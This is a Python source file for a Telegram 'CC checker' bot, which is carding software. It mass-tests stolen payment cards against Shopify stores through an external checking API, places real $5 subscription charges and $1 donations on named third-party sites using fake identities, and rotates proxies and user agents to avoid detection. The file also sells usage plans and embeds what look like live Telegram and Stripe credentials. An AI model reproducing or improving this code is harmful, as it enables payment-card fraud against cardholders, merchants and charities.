# bot.py - Shopify CC Checker Bot (Fixed imports)
from urllib.parse import quote
from telethon import TelegramClient, events, Button
from telethon.tl.types import MessageEntityCustomEmoji
from telethon.extensions import html as thtml
import random, datetime, os, re, asyncio, time, string, aiofiles, aiohttp, json, uuid, warnings, signal

from database import (
    init_db, ensure_user, get_user_plan, set_user_plan, is_banned_user,
    ban_user, unban_user, create_key, use_key, get_all_keys, delete_key,
    add_proxy_db, get_random_proxy, get_all_user_proxies, get_proxy_count,
    remove_proxy_by_index, clear_all_proxies, add_site_db, get_user_sites,
    remove_site_db, save_card_to_db, get_total_users, get_premium_count,
    get_total_sites_count, get_total_cards_count, get_approved_count
)

warnings.filterwarnings('ignore')

# ========== CONFIG ==========
API_ID = 36442788
API_HASH = 'a46cfef94ef9de4026597c6a4addf073'
BOT_TOKEN = '8180020111:AAFnyWXzcet_bW3d03Oq-04bHWa5YDCgNY8'
ADMIN_ID = [6598607558]
GROUP_ID = -1003684602999
API_BASE_URL = "https://web-production-a8008.up.railway.app/shopify"

TASK_TIMEOUT = 30

# ========== EMOJIS ==========
CE = {
    "crown": 5039727497143387500, "bolt": 5042334757040423886, "shield": 5042328396193864923,
    "star": 5042176294222037888, "gem": 5042050649248760772, "check": 5039793437776282663,
    "fire": 5039644681583985437, "party": 5039778134807806727, "chart": 5042290883949495533,
    "cross": 5040042498634810056, "info": 5042306247047513767, "gift": 5041975203853239332,
    "stop": 5039671744172917707, "warn": 5039665997506675838, "link": 5042101437237036298,
    "globe": 5042186567783809934, "trash": 5039614900280754969, "search": 5039649904264217620,
}
PE = "⭐"

# ========== Random User Agent ==========
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0',
]

def random_ua():
    return random.choice(USER_AGENTS)

# ========== HTML + Emoji Helpers ==========
def _build_entities(html_text, emoji_ids=None):
    text, entities = thtml.parse(html_text)
    if emoji_ids:
        idx, utf16_pos = 0, 0
        for ch in text:
            if ch == PE and idx < len(emoji_ids):
                entities.append(MessageEntityCustomEmoji(offset=utf16_pos, length=1, document_id=emoji_ids[idx]))
                idx += 1
            utf16_pos += 2 if ord(ch) > 0xFFFF else 1
    return text, sorted(entities, key=lambda e: e.offset)

async def styled_reply(event, html_text, buttons=None, emoji_ids=None):
    text, entities = _build_entities(html_text, emoji_ids)
    return await event.reply(text, formatting_entities=entities, buttons=buttons, link_preview=False)

async def styled_edit(msg, html_text, buttons=None, emoji_ids=None):
    text, entities = _build_entities(html_text, emoji_ids)
    await msg.edit(text, formatting_entities=entities, buttons=buttons, link_preview=False)

async def styled_send(chat_id, html_text, emoji_ids=None):
    text, entities = _build_entities(html_text, emoji_ids)
    return await client.send_message(chat_id, text, formatting_entities=entities, link_preview=False)

def pbtn(text, data=None, url=None):
    if url: return Button.url(text, url)
    if data: return Button.inline(text, data.encode() if isinstance(data, str) else data)
    return Button.inline(text, b"none")

# ========== Helper Functions ==========
def get_cc_limit(plan, user_id=None):
    limits = {"free": 300, "pro": 2000, "toji": 5000}
    if user_id and user_id in ADMIN_ID: return 5000
    return limits.get(plan.lower(), 300)

def extract_card(text):
    match = re.search(r'(\d{12,16})[|\s/]*(\d{1,2})[|\s/]*(\d{2,4})[|\s/]*(\d{3,4})', text)
    if match:
        cc, mm, yy, cvv = match.groups()
        if len(yy) == 4: yy = yy[2:]
        return f"{cc}|{mm}|{yy}|{cvv}"
    return None

def extract_all_cards(text):
    cards = set()
    for line in text.splitlines():
        card = extract_card(line)
        if card: cards.add(card)
    return list(cards)

def is_valid_url(url):
    domain = url.lower()
    if domain.startswith(('http://', 'https://')):
        try: domain = urlparse(url).netloc
        except: return False
    pattern = r'^[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?)*\.[a-zA-Z]{2,}$'
    return bool(re.match(pattern, domain))

def extract_urls(text):
    urls = set()
    for line in text.split('\n'):
        cleaned = re.sub(r'^[\s\-\+\|,\d\.\)\(\[\]]+', '', line.strip()).split(' ')[0]
        if cleaned and is_valid_url(cleaned): urls.add(cleaned)
    return list(urls)

def parse_proxy(proxy):
    proxy = proxy.strip()
    proxy_type = 'http'
    protocol_match = re.match(r'^(socks5|socks4|http|https)://(.+)$', proxy, re.IGNORECASE)
    if protocol_match:
        proxy_type = protocol_match.group(1).lower()
        proxy = protocol_match.group(2)
    
    host = port = username = password = None
    match = re.match(r'^([^@:]+):([^@]+)@([^:@]+):(\d+)$', proxy)
    if match:
        username, password, host, port = match.groups()
    else:
        match = re.match(r'^([^:]+):(\d+):([^:]+):(.+)$', proxy)
        if match:
            host, port, username, password = match.groups()
        else:
            match = re.match(r'^([^:@]+):(\d+)$', proxy)
            if match:
                host, port = match.groups()
    
    if not host or not port: return None
    try: port = int(port)
    except: return None
    if port <= 0 or port > 65535: return None
    
    proxy_url = f"{proxy_type}://"
    if username and password:
        proxy_url += f"{username}:{password}@{host}:{port}"
    else:
        proxy_url += f"{host}:{port}"
    
    return {'ip': host, 'port': str(port), 'username': username, 'password': password, 'proxy_url': proxy_url, 'type': proxy_type}

async def test_proxy(proxy_url):
    try:
        timeout = aiohttp.ClientTimeout(total=10)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get('http://httpbin.org/ip', proxy=proxy_url) as resp:
                return resp.status == 200
    except:
        return False

async def get_bin_info(card_number):
    try:
        bin_num = card_number[:6]
        async with aiohttp.ClientSession() as session:
            async with session.get(f"https://bins.antipublic.cc/bins/{bin_num}") as res:
                if res.status != 200: return '-', '-', '-', '-', '-', ''
                data = await res.json()
                return (data.get('brand','-'), data.get('type','-'), data.get('level','-'),
                        data.get('bank','-'), data.get('country_name','-'), data.get('country_flag',''))
    except:
        return '-', '-', '-', '-', '-', ''

def get_status_header(status):
    if status == "Charged": return f"{PE} CHARGED {PE}", [CE["gem"], CE["gem"]]
    elif status == "Approved": return f"{PE} APPROVED {PE}", [CE["check"], CE["check"]]
    return f"{PE} DECLINED {PE}", [CE["cross"], CE["cross"]]

# ========== Site Check ==========
SITE_ERRORS = ['timeout', 'error', 'failed', 'declined', 'invalid', 'empty', 'cloudflare', '502', '503', '504']

def is_site_error(msg):
    if not msg: return True
    return any(k in msg.lower() for k in SITE_ERRORS)

async def check_card(card, site, proxy_url):
    try:
        encoded_site = quote(site if site.startswith('http') else f'https://{site}', safe='')
        url = f'{API_BASE_URL}?site={encoded_site}&cc={quote(card, safe="")}'
        if proxy_url:
            url += f'&proxy={quote(proxy_url, safe="")}'
        
        timeout = aiohttp.ClientTimeout(total=30)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(url) as resp:
                if resp.status != 200:
                    return {"Status": "SiteError", "Response": f"HTTP {resp.status}", "Gateway": "-", "Price": "-"}
                data = await resp.json()
        
        response = data.get('Response', '')
        price = data.get('Price', '-')
        gateway = data.get('Gate', 'Shopify')
        
        if 'charged' in response.lower() or 'order completed' in response.lower():
            return {"Status": "Charged", "Response": response[:150], "Gateway": gateway, "Price": price}
        elif 'approved' in response.lower() or 'insufficient' in response.lower():
            return {"Status": "Approved", "Response": response[:150], "Gateway": gateway, "Price": price}
        elif is_site_error(response):
            return {"Status": "SiteError", "Response": response[:100], "Gateway": gateway, "Price": price}
        return {"Status": "Declined", "Response": response[:100], "Gateway": gateway, "Price": price}
    except asyncio.TimeoutError:
        return {"Status": "SiteError", "Response": "Timeout", "Gateway": "-", "Price": "-"}
    except Exception as e:
        return {"Status": "Error", "Response": str(e)[:100], "Gateway": "-", "Price": "-"}

async def check_with_retry(card, sites, proxy_url, max_retries=3):
    used = set()
    for attempt in range(max_retries):
        available = [i for i in range(len(sites)) if i not in used]
        if not available: break
        idx = random.choice(available)
        site = sites[idx]
        used.add(idx)
        
        result = await check_card(card, site, proxy_url)
        if result.get("Status") != "SiteError":
            return result, idx + 1
        if attempt < max_retries - 1:
            await asyncio.sleep(0.5)
    return {"Status": "Error", "Response": "All sites failed", "Gateway": "-", "Price": "-"}, -1

# ========== Stripe $5 Charge ==========
async def stripe5_check(cc, month, year, cvv, proxy_url):
    try:
        async with aiohttp.ClientSession() as session:
            headers = {'User-Agent': random_ua()}
            async with session.get('https://www.galaxie.com/subscribe/2', headers=headers, proxy=proxy_url) as resp:
                html = await resp.text()
            
            form_id = re.search(r'name="form_build_id"\s+value="([^"]+)"', html)
            honeypot = re.search(r'name="honeypot_time"\s+value="([^"]+)"', html)
            if not form_id or not honeypot:
                return "Declined", "Failed to extract data"
            
            username = ''.join(random.choices(string.ascii_lowercase, k=8))
            data = {
                'user_name': username, 'user_pass': '@Test123', 'user_pass2': '@Test123',
                'email': f'{username}@gmail.com', 'first_name': 'John', 'last_name': 'Doe',
                'address': '123 Main St', 'city': 'New York', 'state': 'NY', 'zip': '10001',
                'country': 'United States', 'phone': '5551234567',
                'ccnumber': cc, 'ccexpmonth': month, 'ccexpyear': f"20{year}" if len(year)==2 else year,
                'cvs': cvv, 'form_build_id': form_id.group(1), 'form_id': 'subscription_purchase_form',
                'honeypot_time': honeypot.group(1), 'url': ''
            }
            
            async with session.post('https://www.galaxie.com/subscribe/2', data=data, headers=headers, proxy=proxy_url) as resp:
                text = await resp.text()
            
            if 'thank you' in text.lower() or 'success' in text.lower():
                return "Approved", "✅ $5 Charged!"
            return "Declined", "Card declined"
    except:
        return "Declined", "Error"

# ========== Stripe $1 Donation ==========
async def stripe1_check(cc, month, year, cvv, proxy_url):
    try:
        email = f"user{random.randint(1000,9999)}@gmail.com"
        if len(year) == 2: year = f"20{year}"
        
        async with aiohttp.ClientSession() as session:
            data = {
                'type': 'card', 'card[number]': cc, 'card[cvc]': cvv,
                'card[exp_month]': month, 'card[exp_year]': year,
                'billing_details[name]': 'Test User', 'billing_details[email]': email,
                'key': 'pk_live_51OvrJGRxAfihbegmoT7FwLu2sYpSqHUKvQpNDKyhgVkpNtkoU4bypkWfTsk5A3JLg7o7X1Fsrfwisy2cGnMDd5Lc00qvS6YatH'
            }
            async with session.post('https://api.stripe.com/v1/payment_methods', data=data, proxy=proxy_url) as res:
                if res.status != 200: return "Declined", "Failed"
                pm_data = await res.json()
                if 'error' in pm_data: return "Declined", pm_data['error'].get('message', 'Error')
                pm_id = pm_data.get('id')
                if not pm_id: return "Declined", "No payment method"
            
            donate_data = {
                'give-amount': '1', 'give_stripe_payment_method': pm_id,
                'give_first': 'John', 'give_last': 'Doe', 'give_email': email,
                'give_action': 'purchase', 'give-gateway': 'stripe'
            }
            async with session.post('https://www.forechrist.com/donations/', data=donate_data, proxy=proxy_url) as res:
                text = await res.text()
            
            if 'thank you' in text.lower() or 'receipt' in text.lower():
                return "Approved", "✅ $1 Donated!"
            return "Declined", "Donation failed"
    except:
        return "Declined", "Error"

# ========== Bot Client ==========
client = TelegramClient('cc_bot', API_ID, API_HASH)

# ========== Global State ==========
ACTIVE_PROCESSES = {}

# ========== Commands ==========
@client.on(events.NewMessage(pattern=r'(?i)^[/.]start$'))
async def start(event):
    await ensure_user(event.sender_id)
    if await is_banned_user(event.sender_id):
        return await styled_reply(event, f"{PE} <b>BANNED</b>", emoji_ids=[CE["stop"]])
    
    plan = await get_user_plan(event.sender_id)
    limit = get_cc_limit(plan, event.sender_id)
    
    text = f"""{PE} <b>SHOPIFY CHECKER BOT</b>
━━━━━━━━━━━━━━━━━
{PE} <code>/sh</code> - Single CC check
{PE} <code>/mtxt</code> - Mass CC from .txt
{PE} <code>/sd</code> - Stripe $5 charge
{PE} <code>/s1</code> - Stripe $1 donation
━━━━━━━━━━━━━━━━━
{PE} <code>/add</code> - Add sites
{PE} <code>/rm</code> - Remove sites
{PE} <code>/sites</code> - List sites
━━━━━━━━━━━━━━━━━
{PE} <code>/addpxy</code> - Add proxy
{PE} <code>/proxy</code> - List proxies
{PE} <code>/rmpxy</code> - Remove proxy
━━━━━━━━━━━━━━━━━
{PE} <code>/info</code> - Your profile
{PE} <code>/redeem</code> - Redeem key
{PE} <code>/plan</code> - View plans
━━━━━━━━━━━━━━━━━
{PE} Plan: {plan.upper()} | Limit: {limit}"""
    
    kb = [[pbtn("💎 Plans", data="plans"), pbtn("📞 Support", url="https://t.me/MRROOTTG")]]
    await styled_reply(event, text, buttons=kb, emoji_ids=[CE["bolt"], CE["star"], CE["crown"]])

@client.on(events.CallbackQuery(data=b"plans"))
async def plans_cb(event):
    text = f"""{PE} <b>PLANS</b>
━━━━━━━━━━━━━━━━━
{PE} FREE - 300 CCs (Group only)
{PE} PRO - 2000 CCs + Proxy + Private
{PE} TOJI - 5000 CCs + Priority
━━━━━━━━━━━━━━━━━
Contact @MRROOTTG to upgrade"""
    await event.answer()
    await styled_send(event.chat_id, text, emoji_ids=[CE["crown"], CE["star"], CE["gem"]])

# ========== Shopify Single Check ==========
@client.on(events.NewMessage(pattern=r'(?i)^[/.]sh\b'))
async def sh_cmd(event):
    if await is_banned_user(event.sender_id):
        return await styled_reply(event, f"{PE} BANNED", emoji_ids=[CE["stop"]])
    
    await ensure_user(event.sender_id)
    
    proxy_data = await get_random_proxy(event.sender_id)
    if not proxy_data:
        return await styled_reply(event, f"{PE} No proxy! Use /addpxy", emoji_ids=[CE["warn"]])
    
    card = None
    if event.reply_to_msg_id:
        replied = await event.get_reply_message()
        if replied and replied.text:
            card = extract_card(replied.text)
    if not card:
        card = extract_card(event.raw_text)
    if not card:
        return await styled_reply(event, f"{PE} Format: /sh cc|mm|yy|cvv", emoji_ids=[CE["warn"]])
    
    sites = await get_user_sites(event.sender_id)
    if not sites:
        return await styled_reply(event, f"{PE} No sites! Use /add", emoji_ids=[CE["warn"]])
    
    msg = await styled_reply(event, f"{PE} Checking...", emoji_ids=[CE["bolt"]])
    
    try:
        result, _ = await check_with_retry(card, sites, proxy_data['proxy_url'], 3)
        brand, _, _, bank, country, flag = await get_bin_info(card.split('|')[0])
        header, emojis = get_status_header(result['Status'])
        
        text = f"""{header}
━━━━━━━━━━━━━━━━━
{PE} Card: <code>{card}</code>
{PE} Response: {result['Response'][:100]}
{PE} Gateway: {result['Gateway']}
{PE} Price: {result['Price']}
━━━━━━━━━━━━━━━━━
{PE} BIN: {brand} | {bank}
{PE} Country: {country} {flag}"""
        
        await styled_edit(msg, text, emoji_ids=emojis)
        
        if result['Status'] == "Charged" and event.is_group:
            try: await msg.pin()
            except: pass
    except Exception as e:
        await styled_edit(msg, f"{PE} Error: {e}", emoji_ids=[CE["cross"]])

# ========== Mass Shopify Check ==========
@client.on(events.NewMessage(pattern=r'(?i)^[/.]mtxt\b'))
async def mtxt_cmd(event):
    if await is_banned_user(event.sender_id):
        return await styled_reply(event, f"{PE} BANNED", emoji_ids=[CE["stop"]])
    
    if event.sender_id in ACTIVE_PROCESSES:
        return await styled_reply(event, f"{PE} Already running", emoji_ids=[CE["warn"]])
    
    if not event.reply_to_msg_id:
        return await styled_reply(event, f"{PE} Reply to a .txt file", emoji_ids=[CE["warn"]])
    
    proxy = await get_random_proxy(event.sender_id)
    if not proxy:
        return await styled_reply(event, f"{PE} No proxy!", emoji_ids=[CE["warn"]])
    
    sites = await get_user_sites(event.sender_id)
    if not sites:
        return await styled_reply(event, f"{PE} No sites!", emoji_ids=[CE["warn"]])
    
    replied = await event.get_reply_message()
    path = await replied.download_media()
    try:
        async with aiofiles.open(path, 'r') as f:
            content = await f.read()
        os.remove(path)
    except:
        os.remove(path)
        return await styled_reply(event, f"{PE} Error reading file", emoji_ids=[CE["cross"]])
    
    cards = extract_all_cards(content)
    if not cards:
        return await styled_reply(event, f"{PE} No valid cards", emoji_ids=[CE["cross"]])
    
    plan = await get_user_plan(event.sender_id)
    limit = get_cc_limit(plan, event.sender_id)
    if len(cards) > limit:
        cards = cards[:limit]
    
    ACTIVE_PROCESSES[event.sender_id] = True
    charged = approved = declined = 0
    status_msg = await styled_reply(event, f"{PE} Checking {len(cards)} cards...", emoji_ids=[CE["chart"]])
    
    for card in cards:
        if event.sender_id not in ACTIVE_PROCESSES:
            break
        result, _ = await check_with_retry(card, sites, proxy['proxy_url'], 2)
        if result['Status'] == 'Charged':
            charged += 1
        elif result['Status'] == 'Approved':
            approved += 1
        else:
            declined += 1
        
        await styled_edit(status_msg, f"{PE} ✅ Charged: {charged} | ✅ Approved: {approved} | ❌ Declined: {declined}\n📊 {charged+approved+declined}/{len(cards)}", emoji_ids=[CE["chart"]])
        await asyncio.sleep(0.5)
    
    await styled_edit(status_msg, f"{PE} <b>COMPLETE</b>\n━━━━━━━━━━━━━━━━━\n{PE} Charged: {charged}\n{PE} Approved: {approved}\n{PE} Declined: {declined}\n━━━━━━━━━━━━━━━━━\n{PE} Total: {len(cards)}", emoji_ids=[CE["party"]])
    ACTIVE_PROCESSES.pop(event.sender_id, None)

# ========== Stripe $5 Single ==========
@client.on(events.NewMessage(pattern=r'(?i)^[/.]sd\b'))
async def sd_cmd(event):
    if await is_banned_user(event.sender_id):
        return await styled_reply(event, f"{PE} BANNED", emoji_ids=[CE["stop"]])
    
    card = extract_card(event.raw_text)
    if not card:
        return await styled_reply(event, f"{PE} Format: /sd cc|mm|yy|cvv", emoji_ids=[CE["warn"]])
    
    proxy = await get_random_proxy(event.sender_id)
    if not proxy:
        return await styled_reply(event, f"{PE} No proxy!", emoji_ids=[CE["warn"]])
    
    parts = card.split('|')
    cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
    if len(yy) == 4: yy = yy[2:]
    
    msg = await styled_reply(event, f"{PE} Processing $5 charge...", emoji_ids=[CE["gem"]])
    status, resp = await stripe5_check(cc, mm, yy, cvv, proxy['proxy_url'])
    
    brand, _, _, bank, country, flag = await get_bin_info(cc)
    header = f"{PE} ✅ CHARGED ✅ {PE}" if status == "Approved" else f"{PE} ❌ DECLINED ❌ {PE}"
    emojis = [CE["gem"], CE["gem"]] if status == "Approved" else [CE["cross"], CE["cross"]]
    
    text = f"""{header}
━━━━━━━━━━━━━━━━━
{PE} Card: <code>{card}</code>
{PE} Response: {resp}
━━━━━━━━━━━━━━━━━
{PE} BIN: {brand} | {bank}
{PE} Country: {country} {flag}"""
    
    await styled_edit(msg, text, emoji_ids=emojis)

# ========== Stripe $1 Single ==========
@client.on(events.NewMessage(pattern=r'(?i)^[/.]s1\b'))
async def s1_cmd(event):
    if await is_banned_user(event.sender_id):
        return await styled_reply(event, f"{PE} BANNED", emoji_ids=[CE["stop"]])
    
    card = extract_card(event.raw_text)
    if not card:
        return await styled_reply(event, f"{PE} Format: /s1 cc|mm|yy|cvv", emoji_ids=[CE["warn"]])
    
    proxy = await get_random_proxy(event.sender_id)
    if not proxy:
        return await styled_reply(event, f"{PE} No proxy!", emoji_ids=[CE["warn"]])
    
    parts = card.split('|')
    cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
    if len(yy) == 4: yy = yy[2:]
    
    msg = await styled_reply(event, f"{PE} Processing $1 donation...", emoji_ids=[CE["gift"]])
    status, resp = await stripe1_check(cc, mm, yy, cvv, proxy['proxy_url'])
    
    header = f"{PE} ✅ DONATED ✅ {PE}" if status == "Approved" else f"{PE} ❌ DECLINED ❌ {PE}"
    emojis = [CE["check"], CE["check"]] if status == "Approved" else [CE["cross"], CE["cross"]]
    
    await styled_edit(msg, f"{header}\n━━━━━━━━━━━━━━━━━\n{PE} Response: {resp}", emoji_ids=emojis)

# ========== Site Management ==========
@client.on(events.NewMessage(pattern=r'(?i)^[/.]add\b'))
async def add_site(event):
    text = re.sub(r'^[/.]add\s*', '', event.raw_text, flags=re.I).strip()
    if not text:
        return await styled_reply(event, f"{PE} Usage: /add site.com", emoji_ids=[CE["warn"]])
    
    sites = extract_urls(text)
    added = 0
    for site in sites:
        if await add_site_db(event.sender_id, site):
            added += 1
    await styled_reply(event, f"{PE} Added {added}/{len(sites)} sites", emoji_ids=[CE["check"]])

@client.on(events.NewMessage(pattern=r'(?i)^[/.]rm\b'))
async def rm_site(event):
    text = re.sub(r'^[/.]rm\s*', '', event.raw_text, flags=re.I).strip()
    if not text:
        return await styled_reply(event, f"{PE} Usage: /rm site.com", emoji_ids=[CE["warn"]])
    
    sites = extract_urls(text)
    removed = 0
    for site in sites:
        if await remove_site_db(event.sender_id, site):
            removed += 1
    await styled_reply(event, f"{PE} Removed {removed}/{len(sites)} sites", emoji_ids=[CE["check"]])

@client.on(events.NewMessage(pattern=r'(?i)^[/.]sites$'))
async def list_sites(event):
    sites = await get_user_sites(event.sender_id)
    if not sites:
        return await styled_reply(event, f"{PE} No sites. Use /add", emoji_ids=[CE["warn"]])
    
    text = f"{PE} <b>Your Sites</b> ({len(sites)})\n━━━━━━━━━━━━━━━━━\n"
    for i, s in enumerate(sites[:30], 1):
        text += f"{PE} {i}. {s}\n"
    await styled_reply(event, text, emoji_ids=[CE["globe"]])

# ========== Proxy Management ==========
@client.on(events.NewMessage(pattern=r'(?i)^[/.]addpxy\b'))
async def add_proxy_cmd(event):
    if event.is_group:
        return await styled_reply(event, f"{PE} Private chat only", emoji_ids=[CE["stop"]])
    
    text = re.sub(r'^[/.]addpxy\s*', '', event.raw_text, flags=re.I).strip()
    if not text:
        return await styled_reply(event, f"{PE} Usage: /addpxy ip:port or ip:port:user:pass", emoji_ids=[CE["warn"]])
    
    lines = [l.strip() for l in text.splitlines() if l.strip()]
    count = await get_proxy_count(event.sender_id)
    
    added = 0
    for line in lines[:100-count]:
        proxy = parse_proxy(line)
        if proxy and await test_proxy(proxy['proxy_url']):
            await add_proxy_db(event.sender_id, proxy)
            added += 1
    
    await styled_reply(event, f"{PE} Added {added} working proxies", emoji_ids=[CE["check"]])

@client.on(events.NewMessage(pattern=r'(?i)^[/.]proxy$'))
async def list_proxy_cmd(event):
    if event.is_group:
        return await styled_reply(event, f"{PE} Private chat only", emoji_ids=[CE["stop"]])
    
    proxies = await get_all_user_proxies(event.sender_id)
    if not proxies:
        return await styled_reply(event, f"{PE} No proxies. Use /addpxy", emoji_ids=[CE["warn"]])
    
    text = f"{PE} <b>Proxies</b> ({len(proxies)}/100)\n━━━━━━━━━━━━━━━━━\n"
    for i, p in enumerate(proxies[:30], 1):
        text += f"{PE} {i}. {p['type']}://{p['ip']}:{p['port']}\n"
    await styled_reply(event, text, emoji_ids=[CE["shield"]])

@client.on(events.NewMessage(pattern=r'(?i)^[/.]rmpxy\b'))
async def rm_proxy_cmd(event):
    if event.is_group:
        return await styled_reply(event, f"{PE} Private chat only", emoji_ids=[CE["stop"]])
    
    parts = event.raw_text.split()
    if len(parts) != 2:
        return await styled_reply(event, f"{PE} Usage: /rmpxy index or /rmpxy all", emoji_ids=[CE["warn"]])
    
    if parts[1].lower() == 'all':
        count = await clear_all_proxies(event.sender_id)
        await styled_reply(event, f"{PE} Removed {count} proxies", emoji_ids=[CE["check"]])
    else:
        try:
            idx = int(parts[1]) - 1
            removed = await remove_proxy_by_index(event.sender_id, idx)
            if removed:
                await styled_reply(event, f"{PE} Removed {removed['ip']}:{removed['port']}", emoji_ids=[CE["check"]])
        except:
            await styled_reply(event, f"{PE} Invalid index", emoji_ids=[CE["cross"]])

# ========== User Commands ==========
@client.on(events.NewMessage(pattern=r'(?i)^[/.]info$'))
async def info_cmd(event):
    if await is_banned_user(event.sender_id):
        return await styled_reply(event, f"{PE} BANNED", emoji_ids=[CE["stop"]])
    
    plan = await get_user_plan(event.sender_id)
    limit = get_cc_limit(plan, event.sender_id)
    sites = await get_user_sites(event.sender_id)
    proxies = await get_all_user_proxies(event.sender_id)
    
    text = f"""{PE} <b>PROFILE</b>
━━━━━━━━━━━━━━━━━
{PE} ID: <code>{event.sender_id}</code>
{PE} Plan: {plan.upper()}
{PE} CC Limit: {limit}
{PE} Sites: {len(sites)}
{PE} Proxies: {len(proxies)}/100"""
    
    await styled_reply(event, text, emoji_ids=[CE["info"]])

@client.on(events.NewMessage(pattern=r'(?i)^[/.]redeem\b'))
async def redeem_cmd(event):
    parts = event.raw_text.split()
    if len(parts) != 2:
        return await styled_reply(event, f"{PE} Usage: /redeem KEY", emoji_ids=[CE["warn"]])
    
    success, msg = await use_key(event.sender_id, parts[1].upper())
    emoji = [CE["gift"]] if success else [CE["cross"]]
    await styled_reply(event, f"{PE} {msg}", emoji_ids=emoji)

@client.on(events.NewMessage(pattern=r'(?i)^[/.]plan$'))
async def plan_cmd(event):
    plan = await get_user_plan(event.sender_id)
    text = f"""{PE} <b>PLANS</b>
━━━━━━━━━━━━━━━━━
{PE} FREE - 300 CCs
{PE} PRO - 2000 CCs + Proxy
{PE} TOJI - 5000 CCs + Priority
━━━━━━━━━━━━━━━━━
Your plan: {plan.upper()}
Contact @MRROOTTG to upgrade"""
    await styled_reply(event, text, emoji_ids=[CE["crown"]])

# ========== Admin Commands ==========
@client.on(events.NewMessage(pattern='/stats'))
async def stats_cmd(event):
    if event.sender_id not in ADMIN_ID:
        return await styled_reply(event, f"{PE} Admin only", emoji_ids=[CE["stop"]])
    
    users = await get_total_users()
    premium = await get_premium_count()
    sites = await get_total_sites_count()
    cards = await get_total_cards_count()
    approved = await get_approved_count()
    
    text = f"""{PE} <b>STATS</b>
━━━━━━━━━━━━━━━━━
{PE} Users: {users}
{PE} Premium: {premium}
{PE} Free: {users - premium}
{PE} Sites: {sites}
{PE} Cards: {cards}
{PE} Approved: {approved}"""
    
    await styled_reply(event, text, emoji_ids=[CE["chart"]])

@client.on(events.NewMessage(pattern='/ban'))
async def ban_cmd(event):
    if event.sender_id not in ADMIN_ID:
        return await styled_reply(event, f"{PE} Admin only", emoji_ids=[CE["stop"]])
    
    parts = event.raw_text.split()
    if len(parts) != 2:
        return await styled_reply(event, f"{PE} Usage: /ban user_id", emoji_ids=[CE["warn"]])
    
    await ban_user(int(parts[1]))
    await styled_reply(event, f"{PE} User banned", emoji_ids=[CE["stop"]])

@client.on(events.NewMessage(pattern='/unban'))
async def unban_cmd(event):
    if event.sender_id not in ADMIN_ID:
        return await styled_reply(event, f"{PE} Admin only", emoji_ids=[CE["stop"]])
    
    parts = event.raw_text.split()
    if len(parts) != 2:
        return await styled_reply(event, f"{PE} Usage: /unban user_id", emoji_ids=[CE["warn"]])
    
    await unban_user(int(parts[1]))
    await styled_reply(event, f"{PE} User unbanned", emoji_ids=[CE["check"]])

@client.on(events.NewMessage(pattern='/genkey'))
async def genkey_cmd(event):
    if event.sender_id not in ADMIN_ID:
        return await styled_reply(event, f"{PE} Admin only", emoji_ids=[CE["stop"]])
    
    parts = event.raw_text.split()
    if len(parts) != 4:
        return await styled_reply(event, f"{PE} Usage: /genkey pro 5 30", emoji_ids=[CE["warn"]])
    
    plan = parts[1].lower()
    amount = min(int(parts[2]), 20)
    days = int(parts[3])
    
    keys = []
    for _ in range(amount):
        key = ''.join(random.choices(string.ascii_uppercase + string.digits, k=12))
        await create_key(key, days, plan)
        keys.append(key)
    
    text = f"{PE} <b>Generated {amount} {plan.upper()} keys</b>\n━━━━━━━━━━━━━━━━━\n"
    for k in keys:
        text += f"{PE} <code>{k}</code> - {days} days\n"
    
    await styled_reply(event, text, emoji_ids=[CE["gift"]])

# ========== Main ==========
async def main():
    await init_db()
    print("🚀 Starting bot...")
    await client.start(bot_token=BOT_TOKEN)
    print("✅ Bot running!")
    await client.run_until_disconnected()

if __name__ == "__main__":
    asyncio.run(main())
